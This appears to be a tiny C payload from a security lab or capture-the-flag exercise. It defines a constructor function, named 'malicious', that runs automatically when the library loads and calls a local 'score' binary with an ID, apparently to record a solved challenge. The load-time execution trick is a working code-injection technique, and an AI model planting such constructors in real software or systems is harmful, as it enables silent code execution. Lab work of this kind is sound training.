#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	    system("/usr/local/bin/score 84cd65c2-507c-4453-b222-b2df98f83f68");
}
